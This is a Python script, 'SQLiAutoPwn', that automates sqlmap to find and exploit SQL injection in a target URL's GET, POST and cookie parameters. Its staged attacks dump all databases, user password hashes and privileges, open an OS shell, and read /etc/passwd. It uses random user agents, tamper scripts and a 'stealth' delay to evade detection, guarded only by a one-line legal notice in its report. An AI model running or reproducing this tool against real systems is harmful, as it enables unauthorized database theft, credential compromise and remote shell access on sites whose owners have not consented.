#!/usr/bin/env python3
"""
SQLiAutoPwn - Advanced SQL Injection Automation Framework
Created by: Muhammad Hozaifa Naeem
Version: 1.0 | License: MIT

Usage: python3 sqli_autopwn.py <target_url> [options]
"""

import os
import sys
import subprocess
import re
import json
import argparse
import time
import requests
import random
import threading
import socket
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class SQLiAutoPwn:
    def __init__(self, target_url):
        self.target_url = target_url
        self.scan_id = hashlib.md5(f"{target_url}{time.time()}".encode()).hexdigest()[:8]
        self.results_dir = f"sqli_results_{self.scan_id}"
        self.vulnerabilities = []
        self.session_file = f"session_{self.scan_id}.sqlmap"
        self.user_agents = self.load_user_agents()
        
        # Mode flags
        self.stealth_mode = False
        self.aggressive_mode = False
        self.custom_delay = 0.5
        
        # Create directory structure
        self.create_directories()
        
        # Print the main banner
        print(self.banner())
        
        # Then print the scan info
        print(Fore.CYAN + Style.BRIGHT + f"""
╔══════════════════════════════════════════════════════════════╗
║                SQLiAutoPwn v1.0 - Starting Scan              ║
║                Target: {self.target_url:50} ║
║                Scan ID: {self.scan_id:43} ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def create_directories(self):
        """Create organized directory structure"""
        dirs = [
            self.results_dir,
            f"{self.results_dir}/detection",
            f"{self.results_dir}/enumeration",
            f"{self.results_dir}/exploitation",
            f"{self.results_dir}/data",
            f"{self.results_dir}/reports",
            f"{self.results_dir}/sessions",
            f"{self.results_dir}/logs"
        ]
        
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)
    
    def load_user_agents(self):
        """Load random user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
    
    def banner(self):
        """Display ASCII banner"""
        banner_text = f"""
{Fore.RED}███████╗ ██████╗██╗     ██╗ █████╗ ██████╗ ██████╗ ██████╗ ██╗    ██╗███╗   ██╗
{Fore.RED}██╔════╝██╔════╝██║     ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║    ██║████╗  ██║
{Fore.YELLOW}███████╗██║     ██║     ██║███████║██████╔╝██████╔╝██████╔╝██║ █╗ ██║██╔██╗ ██║
{Fore.YELLOW}╚════██║██║     ██║     ██║██╔══██║██╔══██╗██╔═══╝ ██╔═══╝ ██║███╗██║██║╚██╗██║
{Fore.GREEN}███████║╚██████╗███████╗██║██║  ██║██║  ██║██║     ██║     ╚███╔███╔╝██║ ╚████║
{Fore.GREEN}╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
{Fore.CYAN}                    Advanced SQL Injection Automation Framework
{Fore.WHITE}                          Version 1.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        return banner_text
    
    def check_target(self):
        """Verify target is reachable"""
        print(Fore.YELLOW + "[*] Verifying target availability...")
        try:
            response = requests.get(self.target_url, timeout=10, 
                                  headers={'User-Agent': random.choice(self.user_agents)})
            if response.status_code < 400:
                print(Fore.GREEN + f"[+] Target is reachable (Status: {response.status_code})")
                return True
            else:
                print(Fore.RED + f"[-] Target returned status: {response.status_code}")
                return False
        except Exception as e:
            print(Fore.RED + f"[-] Cannot reach target: {str(e)}")
            return False
    
    def detect_injection_type(self):
        """Advanced injection type detection"""
        print(Fore.CYAN + "\n" + "="*80)
        print(Fore.CYAN + "[*] PHASE 1: INJECTION POINT DETECTION")
        print(Fore.CYAN + "="*80)
        
        parsed_url = urlparse(self.target_url)
        query_params = parse_qs(parsed_url.query)
        
        detection_results = {
            'url': self.target_url,
            'scan_id': self.scan_id,
            'timestamp': datetime.now().isoformat(),
            'has_get_params': bool(query_params),
            'get_params': list(query_params.keys()),
            'detected_methods': [],
            'vulnerabilities': []
        }
        
        # GET Parameter Detection
        if query_params:
            print(Fore.YELLOW + f"[+] Found {len(query_params)} GET parameter(s): {', '.join(query_params.keys())}")
            detection_results['detected_methods'].append('GET')
            
            for param in query_params.keys():
                print(Fore.WHITE + f"  [>] Testing GET parameter: {param}")
                cmd = [
                    'sqlmap', '-u', self.target_url,
                    '-p', param,
                    '--batch',
                    '--random-agent',
                    '--level=1', '--risk=1',
                    '--flush-session',
                    '--output-dir', f'{self.results_dir}/detection/get_{param}'
                ]
                
                result = self.run_command(cmd, capture_output=True)
                if "sqlmap identified the following injection point" in result:
                    vuln_info = {
                        'type': 'GET',
                        'parameter': param,
                        'method': 'GET',
                        'detected': True,
                        'timestamp': datetime.now().isoformat()
                    }
                    detection_results['vulnerabilities'].append(vuln_info)
                    self.vulnerabilities.append(vuln_info)
                    print(Fore.GREEN + f"  [+] VULNERABLE: GET parameter '{param}'")
        
        # Save detection results
        detection_file = f"{self.results_dir}/detection/detection_report.json"
        with open(detection_file, 'w') as f:
            json.dump(detection_results, f, indent=4, default=str)
        
        print(Fore.GREEN + f"\n[+] Detection phase complete. Results saved to: {detection_file}")
        return detection_results
    
    def run_get_attack(self, param):
        """Perform GET-based attack"""
        print(Fore.BLUE + f"\n[+] Launching GET attack on parameter: {param}")
        
        stages = [
            {
                'name': 'Basic Information',
                'cmd': [
                    'sqlmap', '-u', self.target_url,
                    '-p', param,
                    '--batch',
                    '--random-agent',
                    '--level=3', '--risk=2',
                    '--banner',
                    '--current-user',
                    '--current-db',
                    '--hostname',
                    '--is-dba',
                    '--output-dir', f'{self.results_dir}/enumeration/get_{param}_info'
                ]
            },
            {
                'name': 'Database Structure',
                'cmd': [
                    'sqlmap', '-u', self.target_url,
                    '-p', param,
                    '--batch',
                    '--random-agent',
                    '--level=4', '--risk=2',
                    '--dbs',
                    '--tables',
                    '--exclude-sysdbs',
                    '--output-dir', f'{self.results_dir}/enumeration/get_{param}_dbs'
                ]
            },
            {
                'name': 'User Credentials',
                'cmd': [
                    'sqlmap', '-u', self.target_url,
                    '-p', param,
                    '--batch',
                    '--random-agent',
                    '--level=5', '--risk=3',
                    '--users',
                    '--passwords',
                    '--privileges',
                    '--roles',
                    '--output-dir', f'{self.results_dir}/enumeration/get_{param}_creds'
                ]
            },
            {
                'name': 'Data Extraction',
                'cmd': [
                    'sqlmap', '-u', self.target_url,
                    '-p', param,
                    '--batch',
                    '--random-agent',
                    '--level=5', '--risk=3',
                    '--dump-all',
                    '--exclude-sysdbs',
                    '--threads=5',
                    '--output-dir', f'{self.results_dir}/exploitation/get_{param}_data'
                ]
            }
        ]
        
        for stage in stages:
            print(Fore.WHITE + f"    [+] Stage: {stage['name']}")
            self.run_command(stage['cmd'])
    
    def run_post_attack(self, post_data):
        """Perform POST-based attack"""
        print(Fore.BLUE + f"\n[+] Launching POST attack")
        
        cmd = [
            'sqlmap', '-u', self.target_url,
            '--data', post_data,
            '--method', 'POST',
            '--batch',
            '--random-agent',
            '--level=5', '--risk=3',
            '--technique=BEUSTQ',
            '--banner',
            '--current-user',
            '--current-db',
            '--dbs',
            '--tables',
            '--users',
            '--passwords',
            '--dump-all',
            '--exclude-sysdbs',
            '--os-shell',
            '--file-read=/etc/passwd',
            '--threads=5',
            '--output-dir', f'{self.results_dir}/exploitation/post_full'
        ]
        
        self.run_command(cmd)
    
    def run_cookie_attack(self, cookie):
        """Perform cookie-based attack"""
        print(Fore.BLUE + f"\n[+] Launching Cookie attack")
        
        cmd = [
            'sqlmap', '-u', self.target_url,
            '--cookie', cookie,
            '--batch',
            '--random-agent',
            '--level=5', '--risk=3',
            '--technique=BEUSTQ',
            '--banner',
            '--current-user',
            '--current-db',
            '--dbs',
            '--tables',
            '--users',
            '--passwords',
            '--dump-all',
            '--exclude-sysdbs',
            '--os-shell',
            '--file-read=/etc/passwd',
            '--hex',
            '--tamper=between,charencode,space2comment',
            '--output-dir', f'{self.results_dir}/exploitation/cookie_full'
        ]
        
        self.run_command(cmd)
    
    def smart_attack(self):
        """Intelligent attack based on detected vulnerabilities"""
        print(Fore.CYAN + "\n[+] Starting smart attack sequence...")
        
        # Step 1: Detect injection type
        detection = self.detect_injection_type()
        
        # Step 2: Launch appropriate attacks
        if 'GET' in detection['detected_methods'] and self.vulnerabilities:
            for vuln in self.vulnerabilities:
                if vuln['type'] == 'GET':
                    self.run_get_attack(vuln['parameter'])
        
        # Step 3: Always try POST
        print(Fore.YELLOW + "\n[*] Attempting POST-based attacks...")
        post_patterns = [
            'username=admin&password=test',
            'user=admin&pass=test',
            'id=1&submit=true'
        ]
        
        for pattern in post_patterns:
            self.run_post_attack(pattern)
            time.sleep(1)
        
        # Step 4: Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate HTML report"""
        print(Fore.CYAN + "\n[+] Generating comprehensive report...")
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SQLiAutoPwn Report - {self.scan_id}</title>
    <style>
        body {{ font-family: Arial; margin: 40px; }}
        .vuln {{ color: red; font-weight: bold; }}
        pre {{ background: #f4f4f4; padding: 10px; }}
    </style>
</head>
<body>
    <h1>SQLiAutoPwn Security Report</h1>
    <h2>Target: {self.target_url}</h2>
    <h3>Scan ID: {self.scan_id}</h3>
    
    <h2>📊 Summary</h2>
    <p>Vulnerabilities Found: {len(self.vulnerabilities)}</p>
    
    <h2>🔍 Vulnerabilities</h2>
    <ul>
"""
        
        for vuln in self.vulnerabilities:
            html += f'<li class="vuln">{vuln["type"]} injection in parameter: {vuln["parameter"]}</li>'
        
        html += """
    </ul>
    
    <h2>📁 Files Generated</h2>
    <p>All results saved in: <code>""" + self.results_dir + """</code></p>
    
    <h2>⚠️ Legal Notice</h2>
    <p>For authorized testing only. Always obtain permission before testing.</p>
</body>
</html>
"""
        
        with open(f'{self.results_dir}/reports/report.html', 'w') as f:
            f.write(html)
        
        print(Fore.GREEN + f"[+] Report saved to: {self.results_dir}/reports/report.html")
    
    def run_command(self, cmd, capture_output=False, timeout=600):
        """Execute command with error handling"""
        try:
            # Apply stealth delay if enabled
            if self.stealth_mode and self.custom_delay > 0:
                time.sleep(self.custom_delay)
            
            # Log command
            log_file = f"{self.results_dir}/logs/command_{int(time.time())}.log"
            with open(log_file, 'a') as f:
                f.write(f"[{datetime.now()}] Command: {' '.join(cmd)}\n")
            
            # Execute
            if capture_output:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                output = result.stdout + result.stderr
                
                with open(log_file, 'a') as f:
                    f.write(f"Output:\n{output}\n")
                
                return output
            else:
                subprocess.run(cmd, timeout=timeout)
                
        except subprocess.TimeoutExpired:
            print(Fore.RED + f"[-] Command timed out")
        except Exception as e:
            print(Fore.RED + f"[-] Command failed: {str(e)}")
            if capture_output:
                return ""
    
    def run(self):
        """Main execution flow"""
        try:
            # Check target
            if not self.check_target():
                print(Fore.RED + "[-] Target unreachable. Exiting...")
                return
            
            # Run smart attack
            self.smart_attack()
            
            # Final message
            print(Fore.GREEN + "\n" + "="*80)
            print(Fore.GREEN + "[+] SCAN COMPLETE!")
            print(Fore.GREEN + f"[+] Results saved to: {self.results_dir}")
            print(Fore.GREEN + f"[+] Scan ID: {self.scan_id}")
            print(Fore.GREEN + "="*80)
            
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Scan interrupted by user")
        except Exception as e:
            print(Fore.RED + f"\n[-] Error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(
        description='SQLiAutoPwn - Advanced SQL Injection Automation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 sqli_autopwn.py http://target.com/page?id=1
  python3 sqli_autopwn.py http://target.com/login.php --post-data "user=admin&pass=test"
  python3 sqli_autopwn.py http://admin.target.com --cookie "session=abc123"
  python3 sqli_autopwn.py http://target.com --stealth --delay 2
  python3 sqli_autopwn.py http://target.com --aggressive --output ./results
        """)
    
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('--cookie', help='Authentication cookie')
    parser.add_argument('--post-data', help='POST request data')
    parser.add_argument('--param', help='Test specific parameter')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    parser.add_argument('--aggressive', action='store_true', help='Enable aggressive mode')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (default: 0.5)')
    parser.add_argument('--output', help='Custom output directory')
    
    args = parser.parse_args()
    
    scanner = SQLiAutoPwn(args.target)
    
    # Custom output directory
    if args.output:
        scanner.results_dir = args.output
    
    # Apply mode settings
    if args.stealth:
        print(Fore.YELLOW + "[*] Stealth mode enabled")
        scanner.stealth_mode = True
    
    if args.aggressive:
        print(Fore.RED + "[*] Aggressive mode enabled")
        scanner.aggressive_mode = True
    
    # Set custom delay
    if args.delay:
        scanner.custom_delay = args.delay
    
    # Run appropriate attack
    if args.cookie:
        scanner.run_cookie_attack(args.cookie)
    elif args.post_data:
        scanner.run_post_attack(args.post_data)
    elif args.param:
        scanner.run_get_attack(args.param)
    else:
        scanner.run()

if __name__ == "__main__":
    main()
